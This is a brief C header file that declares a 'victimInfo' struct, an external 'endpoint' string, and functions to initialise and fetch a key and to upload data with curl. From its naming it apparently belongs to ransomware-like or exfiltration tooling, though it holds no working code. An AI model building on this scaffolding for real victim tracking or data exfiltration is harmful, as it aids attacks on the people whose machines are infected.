#ifndef NETWORK
#define NETWORK

#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

typedef struct victimInfo{

    char *identifier;
    

}victimInfo;

const extern char endpoint[];

char* initAndGetKey();
int upload(char *url, char *data);

#endif